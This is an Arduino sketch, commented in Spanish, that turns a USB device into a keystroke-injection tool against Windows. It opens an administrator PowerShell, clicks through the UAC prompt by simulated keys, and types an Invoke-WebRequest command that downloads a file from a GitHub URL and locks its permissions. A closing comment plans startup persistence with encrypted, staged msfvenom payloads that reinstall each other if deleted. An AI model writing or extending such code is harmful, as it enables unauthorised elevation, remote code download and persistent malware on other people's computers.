#include <Keyboard.h>


#define DELAY_MULT 20


// Keyboard.h tiene problemas entendiendo otros layouts
// Es necesario presionar shift y la tecla para llegar a ciertos caracteres
void pressShiftedKey(char key) {
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(key);
  delay(DELAY_MULT);
  Keyboard.release(key);
  Keyboard.release(KEY_LEFT_SHIFT);
  delay(DELAY_MULT);
}

void pressGrKey(char key) {
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press(key);
  delay(DELAY_MULT);
  Keyboard.release(key);
  Keyboard.release(KEY_RIGHT_ALT);
  delay(DELAY_MULT);
}

// Esta funcion enmascara pressShiftedKey y pressGrKey mediante muchos
// casos en un switch de forma que se le pueda pasar el caracter que quieres
// y la funcion se encarga de llamar a la funcion correspondiente.
// Tiene fallback a write() de forma que si no es un caracter especial funcione
// con normalidad.
// Esta incompleto porque cuento con que habra muchos caracteres que no necesito.
// De todas formas es muy facilmente expandible, Simplemente un case mas para
// el caracter deseado
char mapSpanishToUS(char c) {
    switch (c) {

    // Shift y AltGr de los Números
    case '!': pressShiftedKey('1'); break;
    case '"': pressShiftedKey('2'); break;
    case '·': pressShiftedKey('3'); break;
    case '$': pressShiftedKey('4'); break;
    case '%': pressShiftedKey('5'); break;
    case '&': pressShiftedKey('6'); break;
    case '/': pressShiftedKey('7'); break;
    case '(': pressShiftedKey('8'); break;
    case ')': pressShiftedKey('9'); break;
    case '=': pressShiftedKey('0'); break;
    
    // AltGr combinaciones específicas del español
    case '|': pressGrKey('1'); break; // AltGr+1
    case '@': pressGrKey('2'); break; // AltGr+2
    case '#': pressGrKey('3'); break; // AltGr+3
    case '~': pressGrKey('4'); break; // AltGr+4
    case '€': pressGrKey('5'); break; // AltGr+5
    case '¬': pressGrKey('6'); break; // AltGr+6
    case '{': pressGrKey('\''); break; // AltGr+´
    case '}': pressGrKey('+'); break; // AltGr+ç
    case '\\': pressGrKey('`'); break; // AltGr+º

    // Caracteres especiales directos
    case ';': pressShiftedKey(','); break;
    case ':': pressShiftedKey('.'); break;
    case '-': Keyboard.write('/'); break;
    case '_': pressShiftedKey('/'); break;

    // Espacio y otros básicos que a veces no funcionan
    case ' ': Keyboard.write(' '); break;
    case '\n': Keyboard.write(KEY_RETURN); break;

    // Fall-back
    default: Keyboard.write(c); break;
  }
}

// EL metodo print de Keyboard.h funciona bastante irregular.
// Se salta caracteres, algunos los duplica, etc, etc...
// He encontrado que write() funciona perfecta y que
// con un peuqeño delay entre letras no deberia dar saltarse ninguna
// Aparte esto permite solucionar el problema del shit y altgr
// enmascarando mapSpanishToUS() que tiene fallback a write()
void printString(String string){
  char buf[string.length() + 1];
  string.toCharArray(buf, string.length() + 1);
  for(int i = 0; i <= string.length(); ++i){
    mapSpanishToUS(buf[i]);
    delay(DELAY_MULT * 2);
  }
}

// Metodo de "bypass" del UAC
// Espera a que salga (suele tardas mas que otros programas)
// Presiona flecha izquierda y enter
// Vuelve a esperar un poco que a veces tarda bastante en quitarse
void bypassUAC(){
  delay(DELAY_MULT * 125);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.release(KEY_LEFT_ARROW);
  delay(DELAY_MULT);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(DELAY_MULT * 50);
}

// Abre la ventana de Ejecución de Comandos rapida mediante Win+R
// Escribe el comando que recibe como argumento
// Lo ejecuta (Enter)
void runCommand(String command){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(DELAY_MULT * 5);
  printString(command);
  delay(DELAY_MULT * 5);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(DELAY_MULT * 50);
}

// funcion principal (main)
void setup() {
  Keyboard.begin(); // Contructor
  delay(DELAY_MULT * 75); // Delay para que se configure como dispositivo HID
  // Igual hay que hacerlo fijo y no relatio al multiplier pero
  // hasta que de problemas para probar mas lento se va a quedar así

  // Prueba 1: Abrir un notepad y escribir un msg.
  runCommand("notepad.exe");
  printString("You're being PWND...");
  
  // Prueba 2: Abrir terminal de administrador
  runCommand("powershell Start-Process powershell -Verb runAs");
  bypassUAC();

	

  // Prueba 3: Cd a Desktop y Descargar fichero con permisos de administrador
  printString("cd ~/Desktop");
  Keyboard.press(KEY_RETURN);
  delay(DELAY_MULT);
  Keyboard.release(KEY_RETURN);
  delay(DELAY_MULT);
  printString("Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/germanquero/arduGator/refs/heads/main/testing.txt\" -OutFile \".\\testing.txt\"; icacls \".\\testing.txt\" /inheritance:r /grant:r \"Administradores:F\" /deny \"Usuarios:(DE,DC)\"");

  // ---
  // todo:
  // Crear exe que "popule" el sistema con distintos despliegues de persistencia
  // wget de ese fichero y dejarlo en el startup 
  // Correrlo en el startup (lo mas invisible posible)
  // Eso deberia descargar versiones con distintas tecnologias nombres paths
  // y cifrados de exes maliciosos qque descarguen (staged) un payload de
  // msfvenom, también cifrado distinto y distintas tecnologias
  // me gustaria implementar funcionalidad al programa de startup y a
  // los programados que revisen la presencia del resto de ficheros de alguna
  // forma y vuelnvan a descargar si alguno falta
  // Con esto se lograria hacer más solido el despliegue, puesto que no depende
  // de ser muchas, ni solo del del startup, habria que eliminar todos
  // los ficheros antes de que se ejecute otro, si no volveria todo a su lugar
  //
  //
}

// demomento no necesitamos codigo en loop
void loop() {} 
